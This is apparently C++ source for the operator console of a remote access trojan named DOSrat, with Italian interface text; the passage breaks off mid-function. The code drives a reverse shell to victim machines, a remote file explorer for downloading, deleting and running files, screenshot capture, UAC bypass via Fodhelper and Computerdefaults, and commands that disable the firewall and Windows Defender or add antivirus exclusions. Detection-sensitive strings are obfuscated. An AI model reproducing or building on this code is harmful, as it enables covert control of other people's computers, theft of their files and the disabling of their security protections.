#pragma once

class Sessione
{
private:
    CLInterface cli;
    TextColor tc;
    DirUtils du;
    ConsoleUtils cu;
    SystemUtils su;

    string decompress_string(const string& str)
    {
        z_stream zs;
        memset(&zs, 0, sizeof(zs));

        if (inflateInit(&zs) != Z_OK)
            throw(std::runtime_error("inflateInit failed while decompressing."));

        zs.next_in = (Bytef*)str.data();
        zs.avail_in = str.size();

        std::vector<char> outbuffer(32768, 0); // Output buffer with initial size of 32KB
        std::string outstring;

        do {
            zs.next_out = reinterpret_cast<Bytef*>(outbuffer.data());
            zs.avail_out = outbuffer.size();

            int ret = inflate(&zs, 0);
            if (ret == Z_STREAM_ERROR) {
                inflateEnd(&zs);
                throw(std::runtime_error("Exception during zlib decompression."));
            }

            // Calculate the number of bytes written to the buffer
            std::size_t bytes_written = outbuffer.size() - zs.avail_out;

            // append the block to the output string
            outstring.append(outbuffer.data(), bytes_written);

            // Resize the buffer if more space is available
            if (zs.avail_out == 0)
                outbuffer.resize(outbuffer.size() * 2);

        } while (zs.avail_out == 0);

        inflateEnd(&zs);

        return outstring;
    }

    bool CheckConnection()
    {
        TextColor tc;

        if (TcpIP::SendString(Sock, "checkconn1"))
        {
            Sleep(1000);

            if (TcpIP::SendString(Sock, "checkconn2"))
            {
                tc.SetColor(tc.Yellow);
                cout << "Errore di connessione temporaneo, riprova." << endl;
                tc.SetColor(tc.Default);

                return true;
            }
        }

        tc.SetColor(tc.Red);
        cout << "Impossibile raggiungere il Client." << endl;
        tc.SetColor(tc.Default);

        Clients[ID].Kill();
        Clu.AggiornaTitolo();

        Sleep(2000);
        return false;
    }

    bool GetInfo()
    {
        Json j;
        VectString Header;
        VectString Body;
        string Response;

        Header.push_back("INFO");
        Header.push_back("VALORE");

        COORD oldPos = cu.GetCursorPos();
        cli.OneCharBar();

        Response = Comunicazioni::PingPong(Sock, "getinfo");

        cli.StopBar();
        cu.SetCursorPos(oldPos);
        cout << "    ";
        cu.SetCursorPos(oldPos);

        if (Response == "")
            return false;

        try { j = Json::parse(Response); }
        catch (exception ex) { return false; }

        Body.push_back("IP Wan");
        Body.push_back(Clients[ID].info.IP);

        Body.push_back("IP Lan");
        Body.push_back(j["IPL"]);

        Body.push_back("Nazione");
        Body.push_back(Clients[ID].info.Location.Country);

        Body.push_back("OS");
        Body.push_back(Clients[ID].info.OS);

        Body.push_back("UAC");
        Body.push_back(Clients[ID].info.UAC);

        Body.push_back("Win. Defender");
        Body.push_back((j["WINDEF"].is_null() ? "??" : (j["WINDEF"] ? "Attivo" : "Disattivo")));

        Body.push_back("Percorso");
        Body.push_back(Clients[ID].info.InstallPath);

        Body.push_back("Versione");
        Body.push_back(Clients[ID].info.Versione);

        Body.push_back("Nome PC");
        Body.push_back(Clients[ID].info.PCname);

        Body.push_back("Nome Utente");
        Body.push_back(Clients[ID].info.UserName);

        Body.push_back("CPU %");
        Body.push_back(j["CPU"]);

        Body.push_back("RAM %");
        Body.push_back(j["RAM"]);

        Body.push_back("Finestra Attiva");
        Body.push_back(j["ACTWIN"]);

        Body.push_back("Data Installazione");
        Body.push_back(j["INSTDATE"]);

        cout << endl;
        cli.Table(Header, Body);
        cout << endl;

        return true;
    }

    bool Reconnect()
    {
        if (TcpIP::SendString(Sock, "reconnect"))
        {
            Clients[ID].Kill();
            Clu.AggiornaTitolo();
            return true;
        }

        return false;
    }

    bool KillClient()
    {
        if (TcpIP::SendString(Sock, "kill"))
        {
            Sleep(1000);
            Clients[ID].Kill();
            Clu.AggiornaTitolo();
            return true;
        }

        return false;
    }

    bool Shutdown()
    {
        if (TcpIP::SendString(Sock, "shutdown"))
        {
            cout << "Comando lanciato.\n" << endl;
            Sleep(1500);
            return true;
        }

        return false;
    }

    bool Reboot()
    {
        if (TcpIP::SendString(Sock, "reboot"))
        {
            cout << "Comando lanciato.\n" << endl;
            Sleep(1500);
            return true;
        }

        return false;
    }

    short UpdateClient()
    {
        bool Hidden = false;
        bool System = false;
        DWORD Attr;

        string FilePath = du.ChoseFileDialog("Client\0*.exe\0", du.GetModuleFilePath().c_str());

        if (FilePath == "")
            return 1;

        Attr = GetFileAttributesA(FilePath.c_str());
        if (Attr != -1)
        {
            Hidden = ((Attr & FILE_ATTRIBUTE_HIDDEN) == FILE_ATTRIBUTE_HIDDEN);
            System = ((Attr & FILE_ATTRIBUTE_SYSTEM) == FILE_ATTRIBUTE_SYSTEM);
        }

        cout << "Invio file in corso..." << endl;
        if (Comunicazioni::UpdateClient(Sock, du.GetBinaryFileContent(FilePath), Hidden, System))
        {
            cout << "File inviato.\n" << endl;
            Sleep(1500);
            Clients[ID].Kill();
            Clu.AggiornaTitolo();
            return 0;
        }

        return -1;
    }

    bool Uninstall()
    {
        if (TcpIP::SendString(Sock, "uninstall"))
        {
            Sleep(1000);
            Clients[ID].Kill();
            Clu.AggiornaTitolo();
            return true;
        }

        return false;
    }

    bool RestartClient()
    {
        if (TcpIP::SendString(Sock, "restart"))
        {
            Sleep(1000);
            Clients[ID].Kill();
            Clu.AggiornaTitolo();
            return true;
        }

        return false;
    }

    bool ReveShell()
    {
        string Res = "";
        string Cmd = "";
        string Path = "";

        cout << endl;

        if (Comunicazioni::PingPong(Sock, (string)AY_OBFUSCATE("reverseshell")) == "OK")
        {
            while (true)
            {
                Path = Comunicazioni::PingPong(Sock, "Get cd");

                if (Path == "")
                    return false;

                cout << Path << ">";
                getline(cin, Cmd);

                if (StringUtils::ToLowerCase(Cmd).substr(0, 3) == "ftp")
                    cout << "Non supportato.\n" << endl;
                else if (StringUtils::ToLowerCase(Cmd).substr(0, 4) == "ping" && (StringUtils::ToLowerCase(Cmd).find("-t") != string::npos || StringUtils::ToLowerCase(Cmd).find("/t") != string::npos))
                    cout << "Non supportato.\n" << endl;
                else if (StringUtils::ToLowerCase(Cmd).substr(0, 3) == "cls")
                {
                    system("cls");
                    UIutils::StampaTitolo(1);
                    cli.SubTitle("Sessione Comandi", 60, tc.Green);
                }
                else if (StringUtils::ToLowerCase(Cmd) == "powershell")
                {
                    cout << "Non puoi eseguire una sessione PS ma puoi lanciare singoli comandi preceduti da \"PowerShell\".\n" << endl;
                }
                else
                {
                    Res = Comunicazioni::PingPong(Sock, Cmd);

                    if (Res == "")
                        return false;
                    else if (Res == (string)AY_OBFUSCATE("Reverse shell closed"))
                    {
                        cout << endl;
                        return true;
                    }

                    cout << Res;
                }
            }
        }

        return false;
    }

    short FileExplorer()
    {
        CliFileExplorer cfe;
        Encode en;
        string Res = "";
        Json j;

        if (!cfe.PrintLayout())
        {
            cout << "Dimensioni della finestra insufficienti, ingrandisci la finestra e riprova." << endl;
            return 1;
        }

        Res = Comunicazioni::PingPong(Sock, "fileexplorer");

        if (Res == "")
            return 2;

        cfe.FilesParse(Json::parse(Res));
        cfe.UpdateContent();

        for (bool b = true; b;)
        {
            cu.SetCursorVisible(false);

            switch (_getch())
            {
                case 72: // UP
                {
                    cfe.UpdateSelection(false);
                    cfe.UpdateContent();
                    break;
                }

                case 80: // DOWN
                {
                    cfe.UpdateSelection(true);
                    cfe.UpdateContent();
                    break;
                }

                case 27: // ESC
                {
                    j.clear();

                    j["Action"] = "Exit";
                    TcpIP::SendString(Sock, j.dump());
                    b = false;
                    break;
                }

                case 13: // ENTER
                {
                    j.clear();

                    if (!cfe.CurrSelectionInfo().IsFile) // Directory
                    {
                        j["Action"] = "OpenDir";
                        j["Path"] = en.AsciiToUnicode(cfe.CurrSelectionInfo().FullPath);

                        cout << "Loading ";
                        cli.OneCharBar();

                        Res = Comunicazioni::PingPong(Sock, j.dump());

                        cli.StopBar();

                        if (Res == "")
                            return 2;
                        else if (Res != "denied")
                        {
                            cfe.FilesParse(Json::parse(Res));
                            cfe.ResetSelection();
                            if (!cfe.UpdateContent())
                            {
                                j.clear();

                                j["Action"] = "GoUp";

                                cout << "Loading ";
                                cli.OneCharBar();

                                Res = Comunicazioni::PingPong(Sock, j.dump());

                                cli.StopBar();

                                if (Res == "")
                                    return 2;

                                cfe.FilesParse(Json::parse(Res));
                                cfe.ResetSelection();
                                cfe.UpdateContent();
                            }
                        }
                        else
                        {
                            cfe.UpdateContent();
                            tc.SetColor(tc.Red);
                            cout << "Access denied.";
                            tc.SetColor(tc.Default);
                        }
                    }
                    else // File
                    {
                        j["Action"] = "RunFile";
                        j["Path"] = en.AsciiToUnicode(cfe.CurrSelectionInfo().FullPath);

                        cout << "Loading ";
                        cli.OneCharBar();

                        Res = Comunicazioni::PingPong(Sock, j.dump());

                        cli.StopBar();

                        if (Res == "")
                            return 2;
                        else
                        {
                            cfe.FilesParse(Json::parse(Res));
                            cfe.UpdateContent();
                        }
                    }

                    cfe.ChangePartition = false;
                    break;
                }

                case 8: // BACKSPACE
                {
                    if (cfe.ChangePartition)
                    {
                        j.clear();

                        j["Action"] = "Refresh";

                        cout << "Loading ";
                        cli.OneCharBar();

                        Res = Comunicazioni::PingPong(Sock, j.dump());

                        cli.StopBar();

                        if (Res == "")
                            return 2;

                        cfe.FilesParse(Json::parse(Res));
                        cfe.UpdateContent();

                        cfe.ChangePartition = false;
                        break;
                    }

                    j.clear();

                    j["Action"] = "GoUp";

                    cout << "Loading ";
                    cli.OneCharBar();

                    Res = Comunicazioni::PingPong(Sock, j.dump());

                    cli.StopBar();

                    if (Res == "")
                        return 2;
                    else if (Res != "denied")
                    {
                        cfe.FilesParse(Json::parse(Res));
                        cfe.ResetSelection();
                        cfe.UpdateContent();
                    }
                    else
                    {
                        cfe.UpdateContent();
                        tc.SetColor(tc.Red);
                        cout << "Access denied.";
                        tc.SetColor(tc.Default);
                    }
                    break;
                }

                case 83: // DEL
                {
                    if (cfe.ChangePartition || cfe.CurrSelectionInfo().Name == "..\\")
                        break;

                    j.clear();

                    j["Action"] = "Delete";
                    j["Path"] = en.AsciiToUnicode(cfe.CurrSelectionInfo().FullPath);
                    j["Type"] = cfe.CurrSelectionInfo().IsFile;

                    cout << "Loading ";
                    cli.OneCharBar();

                    Res = Comunicazioni::PingPong(Sock, j.dump());

                    cli.StopBar();

                    if (Res == "")
                        return 2;
                    else if (Res != "denied")
                    {
                        cfe.FilesParse(Json::parse(Res));
                        cfe.UpdateContent();
                    }
                    else
                    {
                        cfe.UpdateContent();
                        tc.SetColor(tc.Red);
                        cout << "Permission denied.";
                        tc.SetColor(tc.Default);
                    }
                    break;
                }

                case 63: // F5
                {
                    if (cfe.ChangePartition)
                        break;

                    j.clear();

                    j["Action"] = "Refresh";

                    cout << "Loading ";
                    cli.OneCharBar();

                    Res = Comunicazioni::PingPong(Sock, j.dump());

                    cli.StopBar();

                    if (Res == "")
                        return 2;

                    cfe.FilesParse(Json::parse(Res));
                    cfe.UpdateContent();

                    break;
                }

                case 114: // R
                {
                    if (cfe.ChangePartition)
                        break;

                    string NewName;

                    if (cfe.CurrSelectionInfo().Name == "..\\")
                        break;

                    cfe.UpdateContent();
                    cu.SetCursorVisible(true);
                    cout << "NewName: ";
                    getline(cin, NewName);
                    cfe.RealignVisual();

                    if (NewName == "")
                        break;

                    j.clear();

                    j["Action"] = "Rename";
                    j["OldName"] = en.AsciiToUnicode(cfe.CurrSelectionInfo().FullPath);
                    j["NewName"] = en.AsciiToUnicode(cfe.CurrSelectionInfo().Path) + NewName;

                    Res = Comunicazioni::PingPong(Sock, j.dump());

                    if (Res == "")
                        return 2;
                    else if (Res != "denied")
                    {
                        cfe.FilesParse(Json::parse(Res));
                        cfe.UpdateContent();
                    }
                    else
                    {
                        cfe.UpdateContent();
                        tc.SetColor(tc.Red);
                        cout << "Permission denied.";
                        tc.SetColor(tc.Default);
                    }
                    break;
                }

                case 117: // U
                {
                    if (cfe.ChangePartition)
                        break;

                    string LocalFile = du.ChoseFileDialog();
                    string FileName;

                    if (LocalFile == "")
                        break;

                    FileName = en.AsciiToUnicode(cfe.CurrSelectionInfo().Path) + LocalFile.substr(LocalFile.find_last_of("\\") + 1);

                    j.clear();
                    j["Action"] = "Upload";

                    if (!TcpIP::SendString(Sock, j.dump()))
                        return 2;

                    cfe.UpdateContent();
                    cout << "Uploading... ";

                    if (!Comunicazioni::UploadFileWithLoading(Sock, FileName, LocalFile, (cfe.FileNameSize + cfe.HelpSize + 2) - (string("Uploading... ").size() + 2)))
                        return 2;

                    cfe.RealignVisual();

                    if (!TcpIP::RecvString(Sock, Res))
                        return 2;

                    if (Res == "OK")
                    {
                        j.clear();
                        j["Action"] = "Refresh";

                        Res = Comunicazioni::PingPong(Sock, j.dump());

                        if (Res == "")
                            return 2;

                        cfe.FilesParse(Json::parse(Res));
                        cfe.UpdateContent();
                    }
                    else if (Res == "denied")
                    {
                        cfe.UpdateContent();
                        tc.SetColor(tc.Red);
                        cout << "Permission denied.";
                        tc.SetColor(tc.Default);
                        break;
                    }
                    else
                        return 2;

                    break;
                }

                case 100: // D
                {
                    if (cfe.ChangePartition)
                        break;

                    string FileContent;
                    string FileName;
                    string LocalFolder = du.GetModuleFilePath() + Clients[ID].info.PCname + "_" + Clients[ID].info.UserName;

                    if (!cfe.CurrSelectionInfo().IsFile)
                    {
                        cfe.UpdateContent();
                        cout << "Please select a file, for directory use ZIP first.";
                        break;
                    }

                    j.clear();
                    j["Action"] = "Download";
                    j["Path"] = en.AsciiToUnicode(cfe.CurrSelectionInfo().FullPath);

                    if (!TcpIP::SendString(Sock, j.dump()))
                        return 2;

                    cfe.UpdateContent();
                    cout << "Downloading... ";

                    switch (Comunicazioni::DownloadFileWithLoading(Sock, LocalFolder, (cfe.FileNameSize + cfe.HelpSize + 2) - (string("Downloading... ").size() + 2)))
                    {
                        case 0:
                            cfe.RealignVisual();
                            cfe.UpdateContent();

                            LocalFolder += "\\Downloads";
                            su.NoOutputCMD("start \"\" \"" + LocalFolder + "\"");
                            break;

                        case 1:
                            return 2;
                            break;

                        case 2:
                            cfe.RealignVisual();
                            cfe.UpdateContent();

                            tc.SetColor(tc.Red);
                            cout << "Failed: unable to save local file.";
                            tc.SetColor(tc.Default);
                            break;
                    }

                    break;
                }

                case 109: // M
                {
                    if (cfe.ChangePartition)
                        break;

                    string DirName;

                    cfe.UpdateContent();
                    cu.SetCursorVisible(true);
                    cout << "Directory name: ";
                    getline(cin, DirName);
                    cfe.RealignVisual();

                    if (DirName == "")
                        break;

                    j.clear();

                    j["Action"] = "Makedir";
                    j["Path"] = en.AsciiToUnicode(cfe.CurrSelectionInfo().Path) + DirName;

                    Res = Comunicazioni::PingPong(Sock, j.dump());

                    if (Res == "")
                        return 2;
                    else if (Res != "denied")
                    {
                        cfe.FilesParse(Json::parse(Res));
                        cfe.UpdateContent();
                    }
                    else
                    {
                        cfe.UpdateContent();
                        tc.SetColor(tc.Red);
                        cout << "Permission denied.";
                        tc.SetColor(tc.Default);
                    }
                    break;
                }

                case 102: // F
                {
                    if (cfe.ChangePartition)
                        break;

                    string FileName;

                    cfe.UpdateContent();
                    cu.SetCursorVisible(true);
                    cout << "File name: ";
                    getline(cin, FileName);
                    cfe.RealignVisual();

                    if (FileName == "")
                        break;

                    j.clear();

                    j["Action"] = "Makefile";
                    j["Path"] = en.AsciiToUnicode(cfe.CurrSelectionInfo().Path) + FileName;

                    Res = Comunicazioni::PingPong(Sock, j.dump());

                    if (Res == "")
                        return 2;
                    else if (Res != "denied")
                    {
                        cfe.FilesParse(Json::parse(Res));
                        cfe.UpdateContent();
                    }
                    else
                    {
                        cfe.UpdateContent();
                        tc.SetColor(tc.Red);
                        cout << "Permission denied.";
                        tc.SetColor(tc.Default);
                    }
                    break;
                }

                case 120: // X
                {
                    if (cfe.ChangePartition)
                        break;

                    if (cfe.CurrSelectionInfo().Name != "..\\")
                    {
                        cfe.CutCopy.CutOrCopy = false;
                        cfe.CutCopy.IsFile = cfe.CurrSelectionInfo().IsFile;
                        cfe.CutCopy.PathToCutCopy = cfe.CurrSelectionInfo().FullPath;
                        cfe.CutCopy.Name = cfe.CurrSelectionInfo().Name;
                        cfe.UpdateContent();
                    }
                    break;
                }

                case 99: // C
                {
                    if (cfe.ChangePartition)
                        break;

                    if (cfe.CurrSelectionInfo().Name != "..\\")
                    {
                        cfe.CutCopy.CutOrCopy = true;
                        cfe.CutCopy.IsFile = cfe.CurrSelectionInfo().IsFile;
                        cfe.CutCopy.PathToCutCopy = cfe.CurrSelectionInfo().FullPath;
                        cfe.CutCopy.Name = cfe.CurrSelectionInfo().Name;
                        cfe.UpdateContent();
                    }
                    break;
                }

                case 118: // V
                {
                    if (cfe.ChangePartition)
                        break;

                    if (cfe.CutCopy.PathToCutCopy == "")
                        break;

                    j.clear();

                    j["Action"] = "CopyCut";
                    j["CutOrCopy"] = cfe.CutCopy.CutOrCopy;
                    j["Type"] = cfe.CutCopy.IsFile;
                    j["Path"] = en.AsciiToUnicode(cfe.CutCopy.PathToCutCopy);
                    j["Name"] = en.AsciiToUnicode(cfe.CutCopy.Name);

                    cout << "Copy in progress ";
                    cli.OneCharBar();

                    Res = Comunicazioni::PingPong(Sock, j.dump());

                    cli.StopBar();

                    if (Res == "")
                        return 2;
                    else if (Res != "denied")
                    {
                        if (!cfe.CutCopy.CutOrCopy)
                            cfe.CutCopy.PathToCutCopy = "";

                        cfe.FilesParse(Json::parse(Res));
                        cfe.UpdateContent();
                    }
                    else
                    {
                        cfe.UpdateContent();
                        tc.SetColor(tc.Red);
                        cout << "Permission denied.";
                        tc.SetColor(tc.Default);
                    }

                    break;
                }

                case 112: // P
                {
                    j.clear();

                    j["Action"] = "ChangePartition";

                    Res = Comunicazioni::PingPong(Sock, j.dump());

                    if (Res == "")
                        return 2;

                    cfe.FilesParse(Json::parse(Res));
                    cfe.ResetSelection();
                    cfe.UpdateContent();
                    cfe.ChangePartition = true;

                    break;
                }

                case 122: // Z
                {
                    if (cfe.ChangePartition || cfe.CurrSelectionInfo().Name == "..\\")
                        break;

                    j.clear();

                    j["Action"] = (StringUtils::ToLowerCase(cfe.CurrSelectionInfo().Name.substr(cfe.CurrSelectionInfo().Name.size() - 4)) == ".zip") ? "Unzip" : "Zip";
                    j["Path"] = en.AsciiToUnicode(cfe.CurrSelectionInfo().FullPath);
                    j["Name"] = (cfe.CurrSelectionInfo().IsFile) ? en.AsciiToUnicode(cfe.CurrSelectionInfo().Name) : en.AsciiToUnicode(cfe.CurrSelectionInfo().Name.substr(0, cfe.CurrSelectionInfo().Name.size() - 1));

                    cout << "Loading ";
                    cli.OneCharBar();

                    Res = Comunicazioni::PingPong(Sock, j.dump());

                    cli.StopBar();

                    if (Res == "")
                        return 2;
                    else if (Res != "denied")
                    {
                        cfe.FilesParse(Json::parse(Res));
                        cfe.UpdateContent();
                    }
                    else
                    {
                        cfe.UpdateContent();
                        tc.SetColor(tc.Red);
                        cout << "Permission denied.";
                        tc.SetColor(tc.Default);
                    }
                    break;
                }

                default:
                    break;
            }
        }

        cu.SetCursorVisible(true);
        return 0;
    }

    short BypUAC(int mode)
    {
        cout << "Tentativo in corso..." << endl;

        if (!TcpIP::SendString(Sock, (string)AY_OBFUSCATE("bypassuac")))
            return 2;

        if (!TcpIP::SendString(Sock, to_string(mode)))
            return 2;

        string Res;

        if (!TcpIP::RecvString(Sock, Res))
        {
            tc.SetColor(tc.Red);
            cout << "Client terminato dall'AV.\n" << endl;
            tc.SetColor(tc.Default);

            return 2;
        }

        if (Res == "")
        {
            Sleep(1000);

            if (!TcpIP::RecvString(Sock, Res))
                return 2;
        }

        if (Res == "OK")
        {
            tc.SetColor(tc.Lime);
            cout << AY_OBFUSCATE("Bypass eseguito, riavvio del Client in corso...\n") << endl;
            tc.SetColor(tc.Default);
            Sleep(1500);
            Clients[ID].Kill();
            Clu.AggiornaTitolo();
            return 0;
        }
        else if (Res == "NO")
        {
            tc.SetColor(tc.Yellow);
            cout << AY_OBFUSCATE("Bypass non riuscito.\n") << endl;
            tc.SetColor(tc.Default);
            return 1;
        }

        return 2;
    }

    bool InvertMouse()
    {
        string Status;

        Status = Comunicazioni::PingPong(Sock, "invertmouse");

        if (Status == "a")
            cout << "Tasti invertiti.\n" << endl;
        else if (Status == "b")
            cout << "Tasti normali.\n" << endl;
        else
            return false;

        return true;
    }

    bool VibeMouse()
    {
        string Status;

        Status = Comunicazioni::PingPong(Sock, "vibemouse");

        if (Status == "a")
            cout << "Vibrazione attivata.\n" << endl;
        else if (Status == "b")
            cout << "Vibrazione disattivata.\n" << endl;
        else
            return false;

        return true;
    }

    bool AddAVexclusion()
    {
        string Status;

        Status = Comunicazioni::PingPong(Sock, "addexclusion");

        if (Status == "ok")
        {
            tc.SetColor(tc.Lime);
            cout << "Client aggiunto alle esclusioni dell'AV.\n" << endl;
            tc.SetColor(tc.Default);
        }
        else if (Status == "ko")
        {
            tc.SetColor(tc.Red);
            cout << "Errore durante l'aggiunta del Client alle esclusioni.\n" << endl;
            tc.SetColor(tc.Default);
        }
        else if (Status == "no")
        {
            tc.SetColor(tc.Yellow);
            cout << AY_OBFUSCATE("Il computer remoto non usa Windows Defender, l'esclusione non avrebbe nessun effetto.\n") << endl;
            tc.SetColor(tc.Default);
        }
        else
            return false;

        return true;
    }

    bool DisableFirewall()
    {
        string Status;

        Status = Comunicazioni::PingPong(Sock, "disablefw");

        if (Status == "ok")
        {
            tc.SetColor(tc.Lime);
            cout << AY_OBFUSCATE("Firewall disabilitato.\n") << endl;
            tc.SetColor(tc.Default);
        }
        else if (Status == "ko")
        {
            tc.SetColor(tc.Red);
            cout << "Errore durante l'operazione.\n" << endl;
            tc.SetColor(tc.Default);
        }
        else
            return false;

        return true;
    }

    bool Screenshot()
    {
        string Buff;
        string FileName = DateTime::GetDateTime('-', '_', '.') + ".jpg";
        string LocalFolder = du.GetModuleFilePath() + Clients[ID].info.PCname + "_" + Clients[ID].info.UserName;

        Buff = Comunicazioni::PingPong(Sock, "screenshot");
        if (Buff.empty())
            return false;

        Json json = Json::parse(Buff);
        Buff.clear();
        cout << endl;

        if (json.size() > 1)
        {
            VectString schermi;

            for (int i = 0; i < json.size(); i++)
                schermi.push_back((string)json[i]["Nome"] + " (" + (string)json[i]["Width"] + "x" + (string)json[i]["Height"] + ")");

            cout << "Quale schermo vuoi acquisire?" << endl;
            Buff = Comunicazioni::PingPong(Sock, to_string(cli.MenuSingleSelQuadre(schermi)));
            cout << endl;
        }
        else
        {
            cout << "Cattura in corso..." << endl;
            Buff = Comunicazioni::PingPong(Sock, "0");
        }

        if (Buff.empty())
            return false;

        cout << "Immagine ricevuta!" << endl;

        if (!du.CheckDir(LocalFolder))
            if (!du.MakeDir(LocalFolder))
            {
                tc.SetColor(tc.Red);
                cout << "Failed: unable to create local Client folder.";
                tc.SetColor(tc.Default);
                return true;
            }

        LocalFolder += "\\Screenshots";

        if (!du.CheckDir(LocalFolder))
            if (!du.MakeDir(LocalFolder))
            {
                tc.SetColor(tc.Red);
                cout << "Failed: unable to create local Screenshots folder.";
                tc.SetColor(tc.Default);
                return true;
            }

        Buff = decompress_string(Buff);

        if (!du.WriteBinaryFile(LocalFolder + "\\" + FileName, Buff))
        {
            tc.SetColor(tc.Red);
            cout << "Failed: unable to save local file.";
            tc.SetColor(tc.Default);
            return true;
        }

        cout << "Salvata nel percorso " << LocalFolder + "\\" + FileName << endl;

        su.NoOutputCMD("start \"\" \"" + LocalFolder + "\\" + FileName + "\"");

        return true;
    }

    bool Reinstall()
    {
        if (TcpIP::SendString(Sock, "reinstall"))
        {
            Sleep(1000);
            Clients[ID].Kill();
            Clu.AggiornaTitolo();
            return true;
        }

        return false;
    }

    bool DisableAV()
    {
        string Status;

        Status = Comunicazioni::PingPong(Sock, "disableav");

        if (Status == "ok")
        {
            tc.SetColor(tc.Lime);
            cout << AY_OBFUSCATE("Antivirus disabilitato.\nRiavvia il pc remoto per applicare i cambiamenti.\n") << endl;
            tc.SetColor(tc.Default);
        }
        else if (Status == "ko")
        {
            tc.SetColor(tc.Red);
            cout << "Errore durante l'operazione.\n" << endl;
            tc.SetColor(tc.Default);
        }
        else
            return false;

        return true;
    }

public:
    SOCKET Sock;
    int ID;

    void AvviaSessione()
    {
        string cmd;

        system("cls");
        UIutils::StampaTitolo(1);
        cli.SubTitle("Sessione Comandi", 60, tc.Green);

        for (bool Controllo = true; Controllo;)
        {
            UIutils::StampaPrefix(Clients[ID].info.PCname, Clients[ID].info.UserName);
            getline(cin, cmd);
            cmd = StringUtils::ToLowerCase(cmd);

            Clients[ID].InTask = true;
            Sleep(100);

            if (cmd == "help")
            {
                cout << endl;
                cli.SubTitle("Client", 30, tc.Blue);
                UIutils::StampaHelp("Reconnect\t", "- Scollega e ricollega il Client a DOSrat ma senza riavviarlo.");
                UIutils::StampaHelp("Kill\t\t", "- Termina il processo del Client.");
                UIutils::StampaHelp("Update\t\t", "- Aggiorna il Client con un eseguibile locale.");
                UIutils::StampaHelp("Uninstall\t", "- Disinstalla il Client dal PC remoto.");
                UIutils::StampaHelp("Restart\t\t", "- Termina il Client e lo riavvia.");
                UIutils::StampaHelp("Reinstall\t", "- Ripete la procedura d'installazione.");
                cout << endl;

                cli.SubTitle("System", 30, tc.Lime);
                UIutils::StampaHelp("Getinfo\t\t", "- Ottieni informazioni sul PC e sul Client.");
                UIutils::StampaHelp("Shutdown\t", "- Spegne il PC.");
                UIutils::StampaHelp("Reboot\t\t", "- Riavvia il PC.");
                UIutils::StampaHelp((string)AY_OBFUSCATE("Revshell\t"), "- Lancia comandi sulla shell del PC remoto.");
                UIutils::StampaHelp("Explorer\t", "- Gestisci i file del PC remoto.");
                UIutils::StampaHelp((string)AY_OBFUSCATE("BypassUAC\t"), (string)AY_OBFUSCATE("- Prova a bypassare l'UAC e ottenere privilegi amministrativi."));
                UIutils::StampaHelp("AddAVexclusion\t", "- Aggiunge il Client alle esclusioni dell'AV (solo se Admin).");
                UIutils::StampaHelp((string)AY_OBFUSCATE("DisableFirewall\t"), (string)AY_OBFUSCATE("- Disabilita il Firewall (solo se Admin)."));
                UIutils::StampaHelp((string)AY_OBFUSCATE("DisableAV\t"), (string)AY_OBFUSCATE("- Disabilita Windows Defender (solo se Admin)."));
                cout << endl;

                cli.SubTitle("Desktop", 30, tc.SkyBlue);
                UIutils::StampaHelp("Screenshot\t", "- Scarica uno screenshot del desktop.");
                cout << endl;

                cli.SubTitle("Fun", 30, tc.Yellow);
                UIutils::StampaHelp("Invertmouse\t", "- Inverte i tasti del mouse.");
                UIutils::StampaHelp("Vibemouse\t", "- Fa vibrare il puntatore del mouse.");
                cout << endl;

                cli.SubTitle("Utility", 30, tc.Purple);
                UIutils::StampaHelp("Exit\t", "- Torna al menu principale.");
                UIutils::StampaHelp("Clear\t", "- Pulisce la console da tutti i comandi precedenti.");
                UIutils::StampaHelp("Help\t", "- Mostra la lista dei comandi.");
                cout << endl;
            }
            else if (cmd == "getinfo")
            {
                if (!GetInfo())
                    Controllo = CheckConnection();
            }
            else if (cmd == "invertmouse")
            {
                if (!InvertMouse())
                    Controllo = CheckConnection();
            }
            else if (cmd == "exit" || cmd == "close")
            {
                Controllo = false;
            }
            else if (cmd == "reconnect")
            {
                if (!Reconnect())
                    Controllo = CheckConnection();
                else
                    Controllo = false;
            }
            else if (cmd == "clear" || cmd == "cls")
            {
                system("cls");
                UIutils::StampaTitolo(1);
                cli.SubTitle("Sessione Comandi", 60, tc.Green);
            }
            else if (cmd == "kill")
            {
                if (!KillClient())
                    Controllo = CheckConnection();
                else
                    Controllo = false;
            }
            else if (cmd == "shutdown")
            {
                if (!Shutdown())
                    Controllo = CheckConnection();
                else
                    Controllo = false;
            }
            else if (cmd == "reboot")
            {
                if (!Reboot())
                    Controllo = CheckConnection();
                else
                    Controllo = false;
            }
            else if (cmd == "update")
            {
                switch (UpdateClient())
                {
                    case -1: Controllo = CheckConnection(); break;
                    case 0: Controllo = false; break;
                    case 1: break;
                }
            }
            else if (cmd == "uninstall")
            {
                if (!Uninstall())
                    Controllo = CheckConnection();
                else
                    Controllo = false;
            }
            else if (cmd == "restart")
            {
                if (!RestartClient())
                    Controllo = CheckConnection();
                else
                    Controllo = false;
            }
            else if (cmd == (string)AY_OBFUSCATE("revshell"))
            {
                if (!ReveShell())
                    Controllo = CheckConnection();
            }
            else if (cmd == "explorer")
            {
                if (Clients[ID].info.CompatibleVer < 5)
                    UIutils::StampaIncompatibile();
                else
                {
                    switch (FileExplorer())
                    {
                        case 0:
                            system("cls");
                            UIutils::StampaTitolo(1);
                            cli.SubTitle("Sessione Comandi", 60, tc.Green);
                            break;

                        case 1:
                            break;

                        case 2:
                            system("cls");
                            UIutils::StampaTitolo(1);
                            cli.SubTitle("Sessione Comandi", 60, tc.Green);

                            Controllo = CheckConnection();
                            break;
                    }
                }
            }
            else if (cmd == (string)AY_OBFUSCATE("bypassuac"))
            {
                if (Clients[ID].info.CompatibleVer < 5)
                    UIutils::StampaIncompatibile();
                else
                {
                    if (Clients[ID].info.UAC == "Admin")
                        cout << "Il Client e' gia' amministratore." << endl;
                    else
                    {
                        cout << "\nSeleziona la tecnica da usare:" << endl;
                        int tmp = cli.MenuSingleSelQuadre({ "Annulla", (string)AY_OBFUSCATE("Fodhelper"), (string)AY_OBFUSCATE("Computerdefaults")});
                        cout << endl;

                        if (tmp != 0)
                            switch (BypUAC(tmp))
                            {
                                case 0:
                                    Controllo = false;
                                    break;

                                case 1:
                                    break;

                                case 2:
                                    Controllo = CheckConnection();
                                    break;
                            }
                    }
                }
            }
            else if (cmd == "vibemouse")
            {
                if (Clients[ID].info.CompatibleVer < 3)
                    UIutils::StampaIncompatibile();
                else
                {
                    if (!VibeMouse())
                        Controllo = CheckConnection();
                }
            }
            else if (cmd == "addavexclusion")
            {
                if (Clients[ID].info.CompatibleVer < 4)
                    UIutils::StampaIncompatibile();
                else
                {
                    if (Clients[ID].info.UAC == "Admin")
                    {
